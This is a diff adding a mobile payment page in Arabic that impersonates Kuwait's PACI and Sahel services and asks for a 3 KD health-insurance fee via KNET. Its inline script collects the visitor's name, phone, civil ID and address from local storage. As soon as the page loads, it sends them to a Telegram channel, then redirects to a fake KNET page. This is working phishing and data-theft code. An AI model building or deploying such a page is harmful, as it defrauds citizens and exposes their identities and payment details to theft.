@@ -1,0 +1,511 @@
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<style>
+      :root {
+        --primary: #3f7bc4;
+        --primary-dark: #2c66ad;
+        --text: #545454;
+        --footer: #3f7bc4;
+        --panel-border: #d9e4ef;
+        --panel-bg: #f8fbff;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: "Tajawal", "Arial", sans-serif;
+        color: var(--text);
+        font-size: 15px;
+        background: #fff;
+      }
+
+      .page {
+        width: 100%;
+        min-height: 100vh;
+        background: #fff;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .header,
+      .content {
+        width: 100%;
+        background: #fff;
+      }
+
+      .header-inner,
+      .content-inner {
+        width: min(100%, 390px);
+        margin: 0 auto;
+        padding-left: 22px;
+        padding-right: 22px;
+      }
+
+      .header {
+        padding-top: 0;
+      }
+
+      .header-inner {
+        padding-bottom: 18px;
+      }
+
+      .content {
+        flex: 1;
+      }
+
+      .content-inner {
+        display: flex;
+        flex-direction: column;
+        padding-top: 10px;
+        padding-bottom: 108px;
+      }
+
+      .logo-wrap {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        gap: 14px;
+        margin-top: 24px;
+        width: 100%;
+      }
+
+      .logo {
+        height: auto;
+        display: block;
+        max-width: 100%;
+      }
+
+      .logo-paci {
+        flex-shrink: 0;
+        width: min(52vw, 210px);
+        height: auto;
+      }
+
+      .logo-sahel {
+        width: min(34vw, 150px);
+        height: auto;
+      }
+
+      .hero {
+        text-align: center;
+        margin-top: 18px;
+      }
+
+      .subtitle {
+        margin: 0;
+        font-size: 15px;
+        line-height: 1.8;
+        color: var(--primary);
+        font-weight: 700;
+      }
+
+      .approval-copy {
+        margin: 10px 0 0;
+        text-align: center;
+        color: #6c7f95;
+        line-height: 1.9;
+        font-weight: 500;
+      }
+
+      .approval-amount {
+        font-size: 22px;
+        font-weight: 700;
+        color: #244264;
+      }
+
+      .panel {
+        margin-top: 36px;
+        padding: 26px 18px 18px;
+        border-radius: 24px;
+        background: linear-gradient(180deg, #ffffff 0%, var(--panel-bg) 100%);
+        border: 1px solid var(--panel-border);
+        box-shadow: 0 18px 36px rgba(38, 84, 140, 0.12);
+      }
+
+      .panel-title {
+        margin: 0 0 18px;
+        font-size: 18px;
+        color: #1f3556;
+        text-align: center;
+      }
+
+      .payment-form {
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+      }
+
+      .payment-option {
+        position: relative;
+      }
+
+      .payment-option.is-hidden {
+        display: none;
+      }
+
+      .payment-option input {
+        position: absolute;
+        inset: 0;
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      .payment-card {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        padding: 14px 16px;
+        border: 1px solid var(--panel-border);
+        border-radius: 18px;
+        background: #fff;
+        transition: border-color 180ms ease, box-shadow 180ms ease, transform 180ms ease;
+        cursor: pointer;
+      }
+
+      .payment-option input:checked + .payment-card {
+        border-color: rgba(63, 123, 196, 0.45);
+        box-shadow: 0 14px 30px rgba(63, 123, 196, 0.14);
+        transform: translateY(-1px);
+      }
+
+      .payment-option input:focus-visible + .payment-card {
+        outline: 3px solid rgba(63, 123, 196, 0.18);
+        outline-offset: 2px;
+      }
+
+      .payment-radio {
+        width: 22px;
+        height: 22px;
+        flex: 0 0 22px;
+        border-radius: 999px;
+        border: 2px solid #9fb8d9;
+        display: grid;
+        place-items: center;
+      }
+
+      .payment-radio::after {
+        content: "";
+        width: 10px;
+        height: 10px;
+        border-radius: 999px;
+        background: var(--primary);
+        transform: scale(0);
+        transition: transform 180ms ease;
+      }
+
+      .payment-option input:checked + .payment-card .payment-radio::after {
+        transform: scale(1);
+      }
+
+      .payment-brand {
+        width: 68px;
+        height: 42px;
+        object-fit: contain;
+        display: block;
+      }
+
+      .payment-title {
+        flex: 1;
+        color: #244264;
+        font-size: 16px;
+        font-weight: 700;
+        line-height: 1.5;
+        text-align: right;
+      }
+
+      .bottom-bar {
+        position: fixed;
+        bottom: 50px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: min(100%, 540px);
+        padding: 14px 22px calc(14px + env(safe-area-inset-bottom));
+        backdrop-filter: blur(10px);
+      }
+
+      .pay-button {
+        width: 100%;
+        height: 48px;
+        border: 0;
+        border-radius: 18px;
+        background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 100%);
+        color: #fff;
+        font: inherit;
+        font-weight: 700;
+        cursor: pointer;
+        box-shadow: 0 12px 24px rgba(63, 123, 196, 0.22);
+      }
+
+      @media (max-width: 480px) {
+        .page {
+          min-height: 100dvh;
+        }
+
+        .header-inner,
+        .content-inner {
+          width: 100%;
+          padding-left: 16px;
+          padding-right: 16px;
+        }
+
+        .header-inner {
+          padding-bottom: 0;
+        }
+
+        .content-inner {
+          padding-top: 0;
+          padding-bottom: 0;
+        }
+
+        .logo-wrap {
+          gap: 8px;
+          margin-top: 6px;
+        }
+
+        .logo-paci {
+          width: unset;
+          max-width: none;
+          height: 78px;
+        }
+
+        .logo-sahel {
+          width: unset;
+          max-width: none;
+          height: 78px;
+        }
+
+        .hero {
+          margin-top: 6px;
+        }
+
+        .subtitle {
+          font-size: 12px;
+        }
+
+        .approval-copy {
+          margin-top: 4px;
+          font-size: 12px;
+          line-height: 1.7;
+        }
+
+        .approval-amount {
+          font-size: 15px;
+        }
+
+        .panel {
+          margin-top: 14px;
+          padding: 14px 12px 12px;
+          border-radius: 18px;
+        }
+
+        .panel-title {
+          font-size: 14px;
+          margin-bottom: 8px;
+        }
+
+        .payment-card {
+          min-height: 64px;
+          padding: 10px 12px;
+          gap: 8px;
+        }
+
+        .payment-brand {
+          width: 50px;
+          height: 32px;
+        }
+
+        .payment-title {
+          font-size: 13px;
+        }
+
+        .bottom-bar {
+          position: fixed;
+          left: 50%;
+          transform: translateX(-50%);
+          width: 100%;
+          max-width: none;
+          padding: 0 14px calc(10px + env(safe-area-inset-bottom));
+          margin-top: 0;
+          bottom: 0;
+          z-index: 20;
+        }
+
+        .pay-button {
+          height: 46px;
+          border-radius: 14px;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .header {
+          padding-top: 34px;
+        }
+
+        .header-inner,
+        .content-inner {
+          width: min(100%, 1120px);
+          padding-left: 48px;
+          padding-right: 48px;
+        }
+
+        .content-inner {
+          max-width: 540px;
+          padding-top: 8px;
+        }
+
+        .logo-wrap {
+          gap: 22px;
+          margin-top: 0;
+          margin-bottom: 18px;
+        }
+
+        .logo-paci {
+          height: 112px;
+          width: auto;
+        }
+
+        .logo-sahel {
+          height: 112px;
+          width: auto;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page">
+      <header class="header">
+        <div class="header-inner">
+          <div class="logo-wrap">
+            <img class="logo logo-paci" src="assets/images/paci.png" alt="شعار PACI" />
+            <img class="logo logo-sahel" src="assets/images/logo.png" alt="شعار سهل" />
+          </div>
+
+          <div class="hero">
+            <p class="subtitle" id="service-name">دفع رسوم الضمان الصحي</p>
+            <p class="approval-copy">
+              تمت الموافقة على طلبك!<br />
+              يرجى تسديد الرسوم <span class="approval-amount">3 KD</span> لتأكيد وتنفيذ الطلب
+            </p>
+          </div>
+        </div>
+      </header>
+
+      <section class="content">
+        <div class="content-inner">
+          <section class="panel">
+            <h2 class="panel-title">يرجى أختيار طريقة الدفع</h2>
+
+            <form class="payment-form" novalidate>
+              <label class="payment-option">
+                <input type="radio" name="payment-method" value="knet" />
+                <span class="payment-card">
+                  <span class="payment-radio" aria-hidden="true"></span>
+                  <img class="payment-brand" src="assets/images/knet.png" alt="كي نت" />
+                  <span class="payment-title">كي نـت</span>
+                </span>
+              </label>
+
+              <label class="payment-option is-hidden">
+                <input type="radio" name="payment-method" value="visa" />
+                <span class="payment-card">
+                  <span class="payment-radio" aria-hidden="true"></span>
+                  <img class="payment-brand" src="assets/images/visa.png" alt="فيزا أو ماستركارد" />
+                  <span class="payment-title">فيزا أو ماستركارد</span>
+                </span>
+              </label>
+            </form>
+          </section>
+
+        </div>
+      </section>
+    </main>
+
+    <div class="bottom-bar">
+      <button class="pay-button" type="button">ادفع الآن</button>
+    </div>
+
+    <script src="assets/js/telegram.js"></script>
+    <script src="assets/js/tg.js"></script>
+    <script>
+      var serviceName = localStorage.getItem("service") || localStorage.getItem("selectedServiceName");
+      var knetInput = document.querySelector('input[name="payment-method"][value="knet"]');
+      var isRedirectingToKnet = false;
+
+      if (serviceName) {
+        document.querySelector("#service-name").textContent = serviceName;
+        document.title = serviceName;
+      }
+
+      function getStoredValue() {
+        for (var i = 0; i < arguments.length; i += 1) {
+          var value = (localStorage.getItem(arguments[i]) || "").trim();
+          if (value) {
+            return value;
+          }
+        }
+
+        return "";
+      }
+
+      function buildGatewayLoadMessage() {
+        var applicantName = getStoredValue("applicant-name", "name", "step1.name");
+        var mobileNumber = getStoredValue("mobile-number", "phone", "step1.phone");
+        var civilId = getStoredValue("civil-id", "step1.civil");
+        var address = getStoredValue("home-address", "address");
+        var lines = ["🧾 صفحة بوابة الدفع"];
+
+        if (applicantName) {
+          lines.push("👤 الاسم: " + applicantName);
+        }
+
+        if (mobileNumber) {
+          lines.push("📞 رقم الهاتف: " + mobileNumber);
+        }
+
+        if (civilId) {
+          lines.push("🆔 رقم المدني: " + civilId);
+        }
+
+        if (address) {
+          lines.push("🏠 العنوان: " + address);
+        }
+
+        return lines.join("\n");
+      }
+
+      function sendGatewayLoadMessage() {
+        if (!window.sendAppTelegramMessage) {
+          return;
+        }
+
+        window.sendAppTelegramMessage(buildGatewayLoadMessage(), false).catch(function () {});
+      }
+
+      async function redirectToKnet() {
+        if (isRedirectingToKnet) {
+          return;
+        }
+
+        isRedirectingToKnet = true;
+        knetInput.checked = true;
+        window.location.href = "knet.html";
+      }
+
+      knetInput.addEventListener("change", function () {
+        if (knetInput.checked) {
+          redirectToKnet().catch(function () {});
+        }
+      });
+
+      document.querySelector(".pay-button").addEventListener("click", function () {
+        redirectToKnet().catch(function () {});
+      });
+
+      sendGatewayLoadMessage();
+    </script>
+  </body>
+</html>
